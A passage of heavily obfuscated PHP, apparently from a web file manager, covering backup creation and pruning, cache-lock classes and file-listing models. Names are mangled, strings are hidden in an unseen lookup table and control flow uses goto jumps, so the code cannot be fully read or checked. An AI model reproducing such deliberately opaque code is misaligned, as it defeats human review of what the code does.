Model($·úÆì§ğ[747])->update($şî¢¾°¤[$·úÆì§ğ[396]], $şî¢¾°¤); self::$option = $şî¢¾°¤; return self::$option; } public function keep() { $¢¸Üê”Ê =& $_SERVER[Ôó‡è­ƒ]; $­Ò˜¾Ì¡ = self::get(); if ($­Ò˜¾Ì¡[$¢¸Üê”Ê[292]][$¢¸Üê”Ê[755]][$¢¸Üê”Ê[748]] == $¢¸Üê”Ê[89]) { return; } $this->backupKeep($­Ò˜¾Ì¡); self::set(array($¢¸Üê”Ê[766] => 1)); } private function backupKeep($Â¥ë¢œ˜) { $¤‡ê¶…é =& $_SERVER[Ôó‡è­ƒ]; if (self::$manual == 1) { return; } $Æ“šôØÕ = Model($¤‡ê¶…é[747])->listData(); if (empty($Æ“šôØÕ)) { return; } $Ğ¦ø–¼• = 0; $ÀÄô†æÍ = array(); foreach ($Æ“šôØÕ as $ùƒ¶÷…Ñ) { if ($Ğ¦ø–¼• >= 7) { break; } $ÀÄô†æÍ[] = $ùƒ¶÷…Ñ[$¤‡ê¶…é[32]]; $Ğ¦ø–¼•++; } for ($Ğ¦ø–¼• = 0; $Ğ¦ø–¼• < 12; $Ğ¦ø–¼•++) { $ÀÄô†æÍ[] = date($¤‡ê¶…é[767], strtotime("\x2d{$Ğ¦ø–¼•}\40\x6d\157\x6e\164\x68\163")); } $ÀÄô†æÍ = array_unique($ÀÄô†æÍ); $ªÁêŠúñ = Model($¤‡ê¶…é[768])->get($¤‡ê¶…é[769]); foreach ($Æ“šôØÕ as $ùƒ¶÷…Ñ) { if (isset($ùƒ¶÷…Ñ[$¤‡ê¶…é[754]]) && $ùƒ¶÷…Ñ[$¤‡ê¶…é[754]] == $¤‡ê¶…é[89]) { continue; } if (!empty($ùƒ¶÷…Ñ[$¤‡ê¶…é[32]]) && in_array($ùƒ¶÷…Ñ[$¤‡ê¶…é[32]], $ÀÄô†æÍ)) { continue; } Model($¤‡ê¶…é[747])->remove($ùƒ¶÷…Ñ[$¤‡ê¶…é[396]]); $ç¯æ‹¡ = $this->backupPath($Â¥ë¢œ˜, $ªÁêŠúñ); IO::remove($ç¯æ‹¡, !1); } } private function backupPath($Ï—’“, $ßæ§¢µº = false) { $û™Œ¿®” =& $_SERVER[Ôó‡è­ƒ]; if (!$ßæ§¢µº) { $ßæ§¢µº = Model($û™Œ¿®”[768])->get($û™Œ¿®”[769]); } $şß¥õ± = $Ï—’“[$û™Œ¿®”[32]]; $©õ½ = substr(md5($û™Œ¿®”[770] . $ßæ§¢µº . $şß¥õ±), 0, 8); return "\x7b\151\x6f\72{$Ï—’“[$û™Œ¿®”[750]]}\175\x2f\x64\141\164\141\x62\141\163\145\57\x62\x61\x63\x6b\165\x70\57" . $şß¥õ± . $û™Œ¿®”[11] . $©õ½; } public function db() { $“¯æğ³ =& $_SERVER[Ôó‡è­ƒ]; $©Ë—š¿§ = self::get(); if ($©Ë—š¿§[$“¯æğ³[292]][$“¯æğ³[756]][$“¯æğ³[748]] == $“¯æğ³[89]) { return !0; } $¹±ªÎ§… = new BackupDb(); if (!$¹±ªÎ§…->index()) { return !1; } self::set(array($“¯æğ³[771] => 1)); return !0; } public function dbFile() { $à•¿š¼§ =& $_SERVER[Ôó‡è­ƒ]; $Âİ´öàà = self::get(); if ($Âİ´öàà[$à•¿š¼§[292]][$à•¿š¼§[760]][$à•¿š¼§[748]] == $à•¿š¼§[89]) { return !0; } $›‡‹òü¸ = new BackupDbFile(); if (!$›‡‹òü¸->index()) { return !1; } self::set(array($à•¿š¼§[772] => 1)); return !0; } public function file() { $ÛÒÖ¨€Î =& $_SERVER[Ôó‡è­ƒ]; $“ãò€• = self::get(); if ($“ãò€•[$ÛÒÖ¨€Î[292]][$ÛÒÖ¨€Î[196]][$ÛÒÖ¨€Î[748]] == $ÛÒÖ¨€Î[89]) { return !0; } if (!isset($“ãò€•[$ÛÒÖ¨€Î[753]]) || $“ãò€•[$ÛÒÖ¨€Î[753]] == $ÛÒÖ¨€Î[194]) { $…øæá“Î = new BackupFile(); if (!$…øæá“Î->index()) { return !1; } } self::set(array($ÛÒÖ¨€Î[773] => 1, $ÛÒÖ¨€Î[748] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ÉÒ¦åÑ« =& $_SERVER[Ôó‡è­ƒ]; $êœˆŞİ = Backup::get(); self::$io = $êœˆŞİ[$ÉÒ¦åÑ«[750]]; self::$name = $êœˆŞİ[$ÉÒ¦åÑ«[32]]; $†ÏÄ¹ò® = new DbManage(); $“®¦¯Æğ = $†ÏÄ¹ò®->dbType(); $ñ”È…‚Î = array($ÉÒ¦åÑ«[774] => $“®¦¯Æğ, $ÉÒ¦åÑ«[775] => time()); Backup::set($ñ”È…‚Î); $‚’æ¤«¸ = $this->tmpFilesPath() . $ÉÒ¦åÑ«[776] . self::$name . $ÉÒ¦åÑ«[8]; del_dir($‚’æ¤«¸); mk_dir($‚’æ¤«¸); $à÷¹İ¹ = $ç›‰‘±š = 0; $äŒ·µ—ó = new Task($ÉÒ¦åÑ«[777], $ÉÒ¦åÑ«[778], 0, LNG($ÉÒ¦åÑ«[779]) . $ÉÒ¦åÑ«[780] . LNG($ÉÒ¦åÑ«[781])); try { $°¶Œ°ÙÀ = $†ÏÄ¹ò®->db()->getTables(); } catch (Exception $ª¼Í€ô¥) { $äŒ·µ—ó->end(); return !1; } $°¶Œ°ÙÀ = array_diff($°¶Œ°ÙÀ, array($ÉÒ¦åÑ«[782], $ÉÒ¦åÑ«[783])); foreach ($°¶Œ°ÙÀ as $î—Ø¦ç«) { $à÷¹İ¹ += $†ÏÄ¹ò®->model($î—Ø¦ç«)->count(); } $äŒ·µ—ó->task[$ÉÒ¦åÑ«[784]] = $à÷¹İ¹; $GLOBALS[$ÉÒ¦åÑ«[785]] = self::$name; foreach ($°¶Œ°ÙÀ as $î—Ø¦ç«) { $ã÷ì‹‚ = $‚’æ¤«¸ . $î—Ø¦ç« . $ÉÒ¦åÑ«[786]; $èä‰ÚÈó = null; if ($î—Ø¦ç« == $ÉÒ¦åÑ«[787] && (!isset($êœˆŞİ[$ÉÒ¦åÑ«[753]]) || $êœˆŞİ[$ÉÒ¦åÑ«[753]] == $ÉÒ¦åÑ«[194])) { $èä‰ÚÈó = self::$io; } $ç›‰‘±š += $†ÏÄ¹ò®->sqlFromDb($î—Ø¦ç«, $ã÷ì‹‚, $äŒ·µ—ó, $èä‰ÚÈó); } unset($GLOBALS[$ÉÒ¦åÑ«[785]]); $äŒ·µ—ó->end(); if ($ç›‰‘±š > $à÷¹İ¹) { $à÷¹İ¹ = $ç›‰‘±š; } $ñ”È…‚Î = array($ÉÒ¦åÑ«[774] => $“®¦¯Æğ, $ÉÒ¦åÑ«[771] => 1, $ÉÒ¦åÑ«[788] => $à÷¹İ¹, $ÉÒ¦åÑ«[789] => $ç›‰‘±š, $ÉÒ¦åÑ«[790] => time()); Backup::set($ñ”È…‚Î); if ($à÷¹İ¹ - $ç›‰‘±š > 0) { $ıÄñÔ®Ë = $ÉÒ¦åÑ«[791]; if (stristr(I18n::getType(), $ÉÒ¦åÑ«[792])) { $ıÄñÔ®Ë = $ÉÒ¦åÑ«[793]; } write_log(array($ıÄñÔ®Ë, $ñ”È…‚Î), $ÉÒ¦åÑ«[778]); return !1; } return !0; } private function tmpFilesPath() { $’İåæ¨¢ =& $_SERVER[Ôó‡è­ƒ]; $áÜÖË¡ = TEMP_FILES; if ($GLOBALS[$’İåæ¨¢[6]][$’İåæ¨¢[90]][$’İåæ¨¢[794]]) { $áÜÖË¡ = $GLOBALS[$’İåæ¨¢[6]][$’İåæ¨¢[90]][$’İåæ¨¢[794]]; if (!mk_dir($áÜÖË¡) || !is_writable($áÜÖË¡) || !IO::mkfile($áÜÖË¡ . $’İåæ¨¢[795])) { $áÜÖË¡ = TEMP_FILES; } } return $áÜÖË¡; } } goto CÜ¤Øšô¨è; F¾¼Ó¿â›: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $€¸ó°â¸ =& $_SERVER[Ôó‡è­ƒ]; $±ÜìÅùƒ = $GLOBALS[$€¸ó°â¸[6]][$€¸ó°â¸[348]]; self::$cachePath = $±ÜìÅùƒ[$€¸ó°â¸[196]][$€¸ó°â¸[78]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Üø„ó¿, $Çá¾€©Œ = 0) { $¹€ÉĞÈ =& $_SERVER[Ôó‡è­ƒ]; $í†ùÒ‹Š = microtime(!0); $èâ ÷Ê· = $í†ùÒ‹Š + $Çá¾€©Œ + 0.0001; $µ¢û·®¨ = rtrim(self::$cachePath, $¹€ÉĞÈ[8]) . $¹€ÉĞÈ[857] . md5($Üø„ó¿) . $¹€ÉĞÈ[854]; if (file_exists($µ¢û·®¨) && filemtime($µ¢û·®¨) && filemtime($µ¢û·®¨) < time() - 10) { @unlink($µ¢û·®¨); } do { if (file_exists($µ¢û·®¨)) { cacheLockWait(); continue; } $ë«Š®Îì = fopen($µ¢û·®¨, $¹€ÉĞÈ[858]); if (!$ë«Š®Îì) { return !1; } $È©Ïˆ = flock($ë«Š®Îì, LOCK_EX | LOCK_NB); self::$caches[$Üø„ó¿] = array($¹€ÉĞÈ[859] => $ë«Š®Îì, $¹€ÉĞÈ[196] => $µ¢û·®¨); fwrite($ë«Š®Îì, $èâ ÷Ê·); clearstatcache(); if ($ë«Š®Îì && $È©Ïˆ) { return !0; } cacheLockWait(); } while (microtime(!0) < $èâ ÷Ê·); $this->unlock($Üø„ó¿); return !1; } public function lockGet($ıî¦§Ç) { $õéìƒ‡ê =& $_SERVER[Ôó‡è­ƒ]; $¸Ö‘Ÿ¦ = rtrim(self::$cachePath, $õéìƒ‡ê[8]) . $õéìƒ‡ê[857] . md5($ıî¦§Ç) . $õéìƒ‡ê[854]; return file_exists($¸Ö‘Ÿ¦); } public function unlock($¯É‘Şó’) { $ãôÙ öç =& $_SERVER[Ôó‡è­ƒ]; $ëİº«õç = self::$caches[$¯É‘Şó’]; if (!$ëİº«õç) { return; } @flock($ëİº«õç[$ãôÙ öç[859]], LOCK_UN); @fclose($ëİº«õç[$ãôÙ öç[859]]); @unlink($ëİº«õç[$ãôÙ öç[196]]); unset(self::$caches[$¯É‘Şó’]); } } class CacheLockRedis { public function lock($ ¨óÃ¿â, $£ˆÕû = 10) { $¨¹ëè = Cache::init(); $·»Öö = microtime(!0) + $£ˆÕû; while (microtime(!0) < $·»Öö) { $Ì–æğ˜ª = $¨¹ëè->get($ ¨óÃ¿â); if (!$Ì–æğ˜ª) { $¯î‰±ÄÖ = $¨¹ëè->setLock($ ¨óÃ¿â, $·»Öö, $£ˆÕû); if ($¯î‰±ÄÖ) { return !0; } } else { if ($Ì–æğ˜ª < microtime(!0)) { $¨¹ëè->set($ ¨óÃ¿â, $·»Öö, $£ˆÕû * 2); if ($¨¹ëè->get($ ¨óÃ¿â) === $Ì–æğ˜ª) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¾ˆòˆÏ„) { return Cache::init()->get($¾ˆòˆÏ„); } public function unlock($§ÃÄÊ¨Ì) { return Cache::init()->remove($§ÃÄÊ¨Ì); } } class CacheLockMemcached { public function lock($®²«ò‹, $âàë”Õ´ = 0) { $½±Ğì’¹ = Cache::init(); $ÆŞò¾áÑ = microtime(!0) + $âàë”Õ´; while (microtime(!0) < $ÆŞò¾áÑ) { $¯Íã‡µ = $½±Ğì’¹->get($®²«ò‹); if (!$¯Íã‡µ || $¯Íã‡µ < microtime(!0)) { $åÏÚÙ³Ÿ = $½±Ğì’¹->handle->add($®²«ò‹, $ÆŞò¾áÑ, $âàë”Õ´); if ($åÏÚÙ³Ÿ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ë‹ÇÎ‘ö) { return Cache::init()->get($ë‹ÇÎ‘ö); } public function unlock($ô¶†¤§ô) { return Cache::init()->remove($ô¶†¤§ô); } } goto FŒĞÍ«£; Dôæš™×œÕ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($íŸÔÑÜË = false, $êÓšğ†¾ = '', $»°ã³äø = false) { $¹¬šî± =& $_SERVER[Ôó‡è­ƒ]; $™ú½Ùñ = $this->cacheGet($êÓšğ†¾); $ò¹±¨•Â = $this->optionDefault($êÓšğ†¾); $ò¹±¨•Â = is_array($ò¹±¨•Â) ? $ò¹±¨•Â : array(); if (is_array($™ú½Ùñ)) { $™ú½Ùñ = array_merge($ò¹±¨•Â, $™ú½Ùñ); return $íŸÔÑÜË ? isset($™ú½Ùñ[$íŸÔÑÜË]) ? $™ú½Ùñ[$íŸÔÑÜË] : null : $™ú½Ùñ; } $æÎãíîå = $this->filterWhere(array($¹¬šî±[33] => $êÓšğ†¾)); $™ú½Ùñ = $this->where($æÎãíîå)->select(); $™ú½Ùñ = array_to_keyvalue($™ú½Ùñ, $¹¬šî±[95], $¹¬šî±[373]); foreach ($™ú½Ùñ as $£ç¥öÇ³ => $ØÅ¿¢’) { if ($»°ã³äø || in_array($£ç¥öÇ³, $this->jsonField)) { $™ú½Ùñ[$£ç¥öÇ³] = json_decode($ØÅ¿¢’, !0); } } $this->cacheSet($êÓšğ†¾, $™ú½Ùñ); $™ú½Ùñ = array_merge($ò¹±¨•Â, $™ú½Ùñ); return $íŸÔÑÜË ? $™ú½Ùñ[$íŸÔÑÜË] : $™ú½Ùñ; } public function set($À»Ñ‰Ä», $Àƒ€€óê = false, $ÇÉ…ÒÙ¸ = '') { $ØÇ’½¶ğ =& $_SERVER[Ôó‡è­ƒ]; $this->cacheRemove($ÇÉ…ÒÙ¸); $Ä¿øÈÜ = array(); $ÒË±ô÷ = is_array($À»Ñ‰Ä») ? $À»Ñ‰Ä» : array($À»Ñ‰Ä» => $Àƒ€€óê); foreach ($ÒË±ô÷ as $¾Çç©÷« => $ä®¾) { if (is_array($ä®¾)) { $ä®¾ = json_encode_force($ä®¾); } $this->checkLength($ä®¾, !1, $this->tableName . $ØÇ’½¶ğ[4] . $À»Ñ‰Ä»); $ä®¾ = self::textEncode($ä®¾); $ÒË±ô÷ = array($ØÇ’½¶ğ[33] => $ÇÉ…ÒÙ¸, $ØÇ’½¶ğ[95] => $¾Çç©÷«, $ØÇ’½¶ğ[373] => $ä®¾); $Ä¿øÈÜ[] = $this->filterWhere($ÒË±ô÷); } if (!$Ä¿øÈÜ) { return !0; } $³ó€¬ëÆ = $this->cacheKey($ØÇ’½¶ğ[397]); CacheLock::lock($³ó€¬ëÆ); $İüÖ»ü = $this->addAll($Ä¿øÈÜ, array(), !0); CacheLock::unlock($³ó€¬ëÆ); return $İüÖ»ü; } protected function optionDefault($¯œ‚®¢Œ = '') { return !1; } public function setDeep($´Í…¸ª, $åà¸ØÈß = false, $Ñ¼ïãÂ = '') { $¾÷ Úíº = explode($_SERVER[Ôó‡è­ƒ][10], $´Í…¸ª); $¶ß¬Üà = $this->get(); array_set_value($¶ß¬Üà, $´Í…¸ª, $åà¸ØÈß); $this->set($¾÷ Úíº[0], $¶ß¬Üà[$¾÷ Úíº[0]], $Ñ¼ïãÂ); } public function remove($İ­ıƒ©, $ŸŒËË—÷ = '') { $İô¾ñû¤ =& $_SERVER[Ôó‡è­ƒ]; $this->cacheRemove($ŸŒËË—÷); $ÖŸµ‘Çş = $this->filterWhere(array($İô¾ñû¤[95] => $İ­ıƒ©, $İô¾ñû¤[33] => $ŸŒËË—÷)); if (is_null($İ­ıƒ©)) { unset($ÖŸµ‘Çş[$İô¾ñû¤[95]]); } return $this->where($ÖŸµ‘Çş)->delete(); } public function cacheSet($Ôè†¡±‡, $å»üşÚË = false) { return Cache::set($this->cacheKey($Ôè†¡±‡), $å»üşÚË); } public function cacheGet($Í×²Ì“Œ) { return Cache::get($this->cacheKey($Í×²Ì“Œ)); } public function cacheRemove($«Æ‰ú« ) { return Cache::remove($this->cacheKey($«Æ‰ú« )); } protected function filterWhere($Ñ”®ŒØ´) { return $Ñ”®ŒØ´; } protected function cacheKey($’äæ¶îÚ) { return $’äæ¶îÚ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\x75\x72\x63\x65"; protected $tableMeta = array("\164\141\x62\154\145\116\141\155\x65" => "\151\x6f\x5f\x73\157\x75\x72\x63\x65\137\x6d\145\164\x61", "\155\x65\x74\141\x46\151\x65\154\x64" => "\x73\157\x75\x72\143\x65\111\104"); protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\x54\151\155\x65", "\164\151\155\x65", "\x69\156\x73\145\162\x74", "\146\165\x6e\143\164\151\157\156"), array("\143\162\x65\x61\164\145\124\151\x6d\145", "\164\151\155\x65", "\x69\x6e\x73\x65\x72\x74", "\x66\x75\156\143\164\x69\157\156"), array("\166\x69\145\x77\124\x69\x6d\145", "\x74\x69\x6d\145", "\x69\156\x73\145\x72\x74", "\146\x75\156\x63\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($‚€£³Ÿş) { return $this->listSource(array($_SERVER[Ôó‡è­ƒ][398] => $‚€£³Ÿş)); } public function typeName($’İËĞ‘„) { static $ÂÂù¨á = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\145\155", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\x67\162\157\x75\x70"); return $ÂÂù¨á[$’İËĞ‘„ . $_SERVER[Ôó‡è­ƒ][12]]; } public function sourceListInfo($ˆ¤ÖºÏ´, $™†í ı¡ = false) { $†â˜¶ì… =& $_SERVER[Ôó‡è­ƒ]; $ˆ¤ÖºÏ´ = $ˆ¤ÖºÏ´ ? $ˆ¤ÖºÏ´ : array(); $ˆ¤ÖºÏ´ = array_filter(array_unique($ˆ¤ÖºÏ´)); if (!$ˆ¤ÖºÏ´) { return array(); } $èŸÎÌÀÁ = $this->where(array($†â˜¶ì…[399] => array($†â˜¶ì…[7], $ˆ¤ÖºÏ´)))->select(); $this->_listDataApply($èŸÎÌÀÁ, $™†í ı¡); return array_to_keyvalue($èŸÎÌÀÁ, $†â˜¶ì…[399]); } public function pathInfoFilter(&$ºëñËØ²) { $‡•Ä·Áî =& $_SERVER[Ôó‡è­ƒ]; static $¿›İª„´ = false; static $³ı®‡ÅÖ = false; static $æ¬İµçş = false; if (!$¿›İª„´) { $¦’ù  = $‡•Ä·Áî[400]; $¦’ù  .= $‡•Ä·Áî[401]; $¦’ù  .= $‡•Ä·Áî[402]; $ğåèòÙ— = $‡•Ä·Áî[403]; $ØŒ¯èïá = explode($‡•Ä·Áî[50], $ğåèòÙ—); $¿›İª„´ = explode($‡•Ä·Áî[50], $¦’ù ); $³ı®‡ÅÖ = array(); foreach ($¿›İª„´ as $íé¿âÒË) { if (in_array($íé¿âÒË, $ØŒ¯èïá)) { continue; } $³ı®‡ÅÖ[] = $íé¿âÒË; } $æ¬İµçş = explode($‡•Ä·Áî[50], $‡•Ä·Áî[404]); } foreach ($æ¬İµçş as $ì›´´ˆ) { if (isset($ºëñËØ²[$ì›´´ˆ])) { $ºëñËØ²[$ì›´´ˆ] = intval($ºëñËØ²[$ì›´´ˆ]); } } $ºëñËØ²[$‡•Ä·Áî[78]] = $‡•Ä·Áî[405] . $ºëñËØ²[$‡•Ä·Áî[399]] . $‡•Ä·Áî[406]; $ºëñËØ²[$‡•Ä·Áî[33]] = $ºëñËØ²[$‡•Ä·Áî[407]] == 1 ? $‡•Ä·Áî[79] : $‡•Ä·Áî[196]; $ºëñËØ²[$‡•Ä·Áî[408]] = $this->typeName($ºëñËØ²[$‡•Ä·Áî[408]]); if ($ºëñËØ²[$‡•Ä·Áî[407]] != 1) { $ºëñËØ²[$‡•Ä·Áî[171]] = $ºëñËØ²[$‡•Ä·Áî[409]]; unset($ºëñËØ²[$‡•Ä·Áî[409]]); } $øşÍËÈ¥ = $¿›İª„´; if (isset($ºëñËØ²[$‡•Ä·Áî[410]]) && $ºëñËØ²[$‡•Ä·Áî[410]][$‡•Ä·Áî[411]] == -1) { $øşÍËÈ¥ = $³ı®‡ÅÖ; } $ºëñËØ² = array_field_key($ºëñËØ², $øşÍËÈ¥); return $ºëñËØ²; } public function listUserFav() { $ø¨à÷¡Í =& $_SERVER[Ôó‡è­ƒ]; $ÔÉ¸Ïû‹ = Model($ø¨à÷¡Í[412])->listData(); $Ì®‹˜Ê = array_filter_by_field($ÔÉ¸Ïû‹, $ø¨à÷¡Í[33], $ø¨à÷¡Í[413]); $Ì®‹˜Ê = array_to_keyvalue($Ì®‹˜Ê, $ø¨à÷¡Í[12], $ø¨à÷¡Í[78]); if ($Ì®‹˜Ê) { $æ¿õĞ…  = $this->listSource(array($ø¨à÷¡Í[414] => array($ø¨à÷¡Í[415], $Ì®‹˜Ê))); } $æ¿õĞ…  = array_to_keyvalue($æ¿õĞ… [$ø¨à÷¡Í[368]], $ø¨à÷¡Í[399]); foreach ($ÔÉ¸Ïû‹ as &$ûŒ½©¡™) { $ûŒ½©¡™ = array($ø¨à÷¡Í[416] => $ûŒ½©¡™[$ø¨à÷¡Í[396]], $ø¨à÷¡Í[417] => $ûŒ½©¡™[$ø¨à÷¡Í[32]], $ø¨à÷¡Í[418] => $ûŒ½©¡™[$ø¨à÷¡Í[78]], $ø¨à÷¡Í[419] => $ûŒ½©¡™[$ø¨à÷¡Í[33]], $ø¨à÷¡Í[420] => $ûŒ½©¡™[$ø¨à÷¡Í[197]], $ø¨à÷¡Í[421] => $ûŒ½©¡™[$ø¨à÷¡Í[86]]); if ($ûŒ½©¡™[$ø¨à÷¡Í[33]] == $ø¨à÷¡Í[413] && $æ¿õĞ… [$ûŒ½©¡™[$ø¨à÷¡Í[78]]]) { $ûŒ½©¡™[$ø¨à÷¡Í[87]] = $æ¿õĞ… [$ûŒ½©¡™[$ø¨à÷¡Í[78]]]; } } unset($ûŒ½©¡™); return $ÔÉ¸Ïû‹; } public function listUserTag($˜øûí¯×) { $­³ÙÅ†ß =& $_SERVER[Ôó‡è­ƒ]; if ($˜øûí¯× && !is_array($˜øûí¯×)) { $˜øûí¯× = array($˜øûí¯×); } $¯Ó±ÉÆ‡ = Model($­³ÙÅ†ß[422])->listData(); $£†¡¯ß¨ = array(); foreach ($¯Ó±ÉÆ‡ as $£¸ÛØƒğ) { $´şÂçÑŒ = $£¸ÛØƒğ[$­³ÙÅ†ß[78]]; if (!$´şÂçÑŒ) { continue; } if (!isset($£†¡¯ß¨[$´şÂçÑŒ])) { $£†¡¯ß¨[$´şÂçÑŒ] = array(); } $£†¡¯ß¨[$´şÂçÑŒ][] = $£¸ÛØƒğ[$­³ÙÅ†ß[423]]; } $Š´ä§Å³ = array(); foreach ($£†¡¯ß¨ as $ŞÊˆÆ™ => $‡İº¶‹Ä) { $ìÌÆ¥š¦ = !0; if (!$˜øûí¯×) { $Š´ä§Å³[] = $ŞÊˆÆ™; continue; } foreach ($˜øûí¯× as $ö¦ öƒ‹) { if (!in_array($ö¦ öƒ‹, $‡İº¶‹Ä)) { $ìÌÆ¥š¦ = !1; break; } } if ($ìÌÆ¥š¦) { $Š´ä§Å³[] = $ŞÊˆÆ™; } } if (!$Š´ä§Å³) { return array(); } $Ü½î©Å = $this->listSource(array($­³ÙÅ†ß[414] => array($­³ÙÅ†ß[415], $Š´ä§Å³))); if (!$Ü½î©Å || count($Š´ä§Å³) == $Ü½î©Å[$­³ÙÅ†ß[365]][$­³ÙÅ†ß[366]]) { return $Ü½î©Å; } $—ø³ëˆé = array(); $î”íçˆÛ = array_to_keyvalue($Ü½î©Å[$­³ÙÅ†ß[77]], $­³ÙÅ†ß[12], $­³ÙÅ†ß[399]); $ÜÄûä“‘ = array_to_keyvalue($Ü½î©Å[$­³ÙÅ†ß[76]], $­³ÙÅ†ß[12], $­³ÙÅ†ß[399]); $ó‰­ØÉæ = array_merge($ÜÄûä“‘, $î”íçˆÛ); foreach ($Š´ä§Å³ as $´şÂçÑŒ) { if (!in_array($´şÂçÑŒ, $ó‰­ØÉæ)) { $—ø³ëˆé[] = $´şÂçÑŒ; } } if ($—ø³ëˆé) { Model($­³ÙÅ†ß[424])->removeBySource($—ø³ëˆé); } return $Ü½î©Å; } public function listUserRecycle() { $»ƒ—üã =& $_SERVER[Ôó‡è­ƒ]; $«äôş—Æ = Model($»ƒ—üã[425])->listData(); if (!$«äôş—Æ) { return array(); } $û«²ï = array($»ƒ—üã[414] => array($»ƒ—üã[415], $«äôş—Æ), $»ƒ—üã[426] => 1); return $this->listSource($û«²ï); } public function listSource($ëÅ•¬Úá, $»şå­¯ß = 3000, $ß±”òÖç = false) { $Ùı…«ÁÒ =& $_SERVER[Ôó‡è­ƒ]; if (!isset($ëÅ•¬Úá[$Ùı…«ÁÒ[427]])) { $ëÅ•¬Úá[$Ùı…«ÁÒ[427]] = 0; } $Ëç¦Üè = $Ùı…«ÁÒ[428]; $ù’›­Í = $this->field($Ëç¦Üè)->_makeOrder()->where($ëÅ•¬Úá)->selectPage($»şå­¯ß); $this->_listPageCheck($ù’›­Í, $Ëç¦Üè, $ëÅ•¬Úá); $this->_listDataApply($ù’›­Í[$Ùı…«ÁÒ[368]], $ß±”òÖç); $this->_listMake($ù’›­Í); return $ù’›­Í; } private function _listPageCheck(&$¾ğü’ù, $“ş‹øŒ, $¿óùö²î) { $ªÍù°™‘ =& $_SERVER[Ôó‡è­ƒ]; if (!is_array($¾ğü’ù[$ªÍù°™‘[365]])) { return; } $ıÀÍøÊş = $¾ğü’ù[$ªÍù°™‘[365]]; if ($ıÀÍøÊş[$ªÍù°™‘[367]] <= 1) { return; } if ($ıÀÍøÊş[$ªÍù°™‘[366]] >= 100000) { return; } if (Model($ªÍù°™‘[429])->get($ªÍù°™‘[430]) != $ªÍù°™‘[431]) { return; } $“ş‹øŒ = str_replace(array($ªÍù°™‘[53], $ªÍù°™‘[341], $ªÍù°™‘[230]), $ªÍù°™‘[12], $“ş‹øŒ); $“ş‹øŒ = $ªÍù°™‘[432] . str_replace($ªÍù°™‘[50], $ªÍù°™‘[433], $“ş‹øŒ) . $ªÍù°™‘[434]; $ä‹¯¼º¼ = $ªÍù°™‘[435]; $ä‹¯¼º¼ = $ä‹¯¼º¼ . $ªÍù°™‘[436]; $¡Ì…Ÿò = $ıÀÍøÊş[$ªÍù°™‘[362]] * ($ıÀÍøÊş[$ªÍù°™‘[352]] - 1) . $ªÍù°™‘[50] . $ıÀÍøÊş[$ªÍù°™‘[362]]; $àôµ¡ıË = $this->_makeOrder(!0); $Àª  = $ªÍù°™‘[432] . str_replace($ªÍù°™‘[50], $ªÍù°™‘[433], $àôµ¡ıË[0]); if (strpos($Àª , $ªÍù°™‘[437])) { $Àª  = str_replace($ªÍù°™‘[437], $ªÍù°™‘[438], $Àª ); } else { $Àª  .= $ªÍù°™‘[439] . $àôµ¡ıË[1]; } $¨ïš÷Ğ = array(); foreach ($¿óùö²î as $¿ß–Ñ¤« => $‚™íê¼˜) { $¨ïš÷Ğ[$ªÍù°™‘[432] . $¿ß–Ñ¤«] = $‚™íê¼˜; } $this->alias($ªÍù°™‘[440])->field($“ş‹øŒ)->limit($¡Ì…Ÿò)->order($Àª ); $ò˜Ôäéé = $this->join($ä‹¯¼º¼)->where($¨ïš÷Ğ)->select(); if ($ò˜Ôäéé) { $¾ğü’ù[$ªÍù°™‘[368]] = $ò˜Ôäéé; } } protected function _makeOrder($±ëÜª¼ = false) { $Ü£­úİ =& $_SERVER[Ôó‡è­ƒ]; $¦å‘Ÿ¢ = Model($Ü£­úİ[441])->get($Ü£­úİ[442]); $ûí¢ÁÉ = Model($Ü£­úİ[441])->get($Ü£­úİ[443]); $›ÛŸß¼ = array($Ü£­úİ[444] => $Ü£­úİ[445], $Ü£­úİ[446] => $Ü£­úİ[447]); $Õ¿¦ó¿ = array($Ü£­úİ[32] => $Ü£­úİ[32], $Ü£­úİ[80] => $Ü£­úİ[80], $Ü£­úİ[171] => $Ü£­úİ[409], $Ü£­úİ[448] => $Ü£­úİ[448], $Ü£­úİ[449] => $Ü£­úİ[450], $Ü£­úİ[197] => $Ü£­úİ[197], $Ü£­úİ[86] => $Ü£­úİ[86]); $ ÛÛ‹¢ì = Input::get($Ü£­úİ[451], $Ü£­úİ[7], $¦å‘Ÿ¢, array_keys($Õ¿¦ó¿)); $•»ÔÁœ¨ = Input::get($Ü£­úİ[452], $Ü£­úİ[7], $ûí¢ÁÉ, array_keys($›ÛŸß¼)); if (!in_array($ ÛÛ‹¢ì, array_keys($Õ¿¦ó¿))) { $ ÛÛ‹¢ì = $Ü£­úİ[32]; } if (!in_array($•»ÔÁœ¨, array_keys($›ÛŸß¼))) { $ ÛÛ‹¢ì = $Ü£­úİ[444]; } if ($ ÛÛ‹¢ì == $Ü£­úİ[32]) { } $•–òÇ³ = $Ü£­úİ[453] . $Õ¿¦ó¿[$ ÛÛ‹¢ì] . $Ü£­úİ[53] . $›ÛŸß¼[$•»ÔÁœ¨]; $•–òÇ³ = rtrim(trim($•–òÇ³), $Ü£­úİ[50]); if ($±ëÜª¼) { return array($•–òÇ³, $›ÛŸß¼[$•»ÔÁœ¨]); } return $this->order($•–òÇ³); } protected function _listDataApplyItem($á¢’‰Çõ, $úğ‰ ÚÅ = false) { $àğ¥øÒÉ = array($á¢’‰Çõ); $this->_listDataApply($àğ¥øÒÉ, $úğ‰ ÚÅ); return $àğ¥øÒÉ[0]; } protected function _listDataApply(&$Ãäãƒ, $®Ô‹ÛØ¢ = false) { $¦¡‹é¬× =& $_SERVER[Ôó‡è­ƒ]; if (!$Ãäãƒ) { $Ãäãƒ = array(); return; } $ÙÜ¸Íæ™ = 